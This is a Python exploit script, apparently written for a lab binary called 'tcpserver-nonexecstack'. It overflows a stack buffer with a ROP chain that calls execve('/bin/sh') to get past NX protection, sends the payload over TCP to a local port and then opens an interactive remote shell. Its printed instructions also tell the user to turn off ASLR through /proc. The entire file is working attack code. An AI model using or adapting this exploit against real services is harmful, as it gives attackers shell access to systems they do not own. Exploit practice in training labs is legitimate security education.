#!/usr/bin/python3

import socket
import struct

def create_rop_chain():
    # ROP gadgets (these addresses need to be adjusted based on the binary)
    # You'll need to find these addresses using tools like ROPgadget or objdump
    pop_rdi = struct.pack("<Q", 0x400686)  # pop rdi ; ret
    pop_rsi = struct.pack("<Q", 0x4100d3)  # pop rsi ; ret
    pop_rdx = struct.pack("<Q", 0x4006a4)  # pop rdx ; ret
    pop_rax = struct.pack("<Q", 0x415664)  # pop rax ; ret
    syscall = struct.pack("<Q", 0x40132c)  # syscall
    
    # Address of "/bin/sh" string in memory (needs to be adjusted)
    bin_sh_addr = struct.pack("<Q", 0x6a0e30)  # Address of "/bin/sh" string
    
    # Build ROP chain for execve("/bin/sh", NULL, NULL)
    rop_chain = (
        pop_rdi + bin_sh_addr +                # 1st arg: pointer to "/bin/sh"
        pop_rsi + struct.pack("<Q", 0x0) +      # 2nd arg: NULL
        pop_rdx + struct.pack("<Q", 0x0) +      # 3rd arg: NULL
        pop_rax + struct.pack("<Q", 0x3b) +     # syscall number for execve (59)
        syscall                                 # execute syscall
    )
    return rop_chain

def create_payload(buffer_size=1024):
    # Initial buffer overflow padding
    padding = b"A" * buffer_size
    
    # ROP chain to bypass NX
    rop_chain = create_rop_chain()
    
    # Return address to overwrite RIP
    # This is where we want to start executing our ROP chain
    ret_addr = struct.pack("<Q", 0x400596)  # Address of a 'ret' instruction
    
    # Construct final payload
    payload = padding + ret_addr + rop_chain
    return payload

def send_exploit(host, port):
    try:
        # Create socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to target
        print(f"[*] Connecting to {host}:{port}")
        s.connect((host, port))
        
        # Send payload
        print("[*] Sending ROP exploit payload...")
        payload = create_payload()
        s.send(payload)
        
        print("[*] Exploit sent successfully!")
        
        # Try to interact with shell
        while True:
            # Send commands
            command = input("shell> ")
            if command.lower() == 'exit':
                break
            s.send(command.encode() + b'\n')
            
            # Get output
            response = s.recv(4096)
            print(response.decode())
            
    except Exception as e:
        print(f"[!] Error: {str(e)}")
    finally:
        s.close()

if __name__ == "__main__":
    target_host = "127.0.0.1"
    target_port = 9999  # Change this to match your target port
    
    print("ROP Chain Exploit for tcpserver-nonexecstack (NX enabled)")
    print("-----------------------------------------------------")
    print("[!] Remember to disable ASLR with: echo 0 > /proc/sys/kernel/randomize_va_space")
    print("[!] Note: The ROP gadget addresses need to be adjusted for your specific binary")
    print("[!] Use 'ROPgadget --binary tcpserver-nonexecstack' to find gadgets")
    send_exploit(target_host, target_port)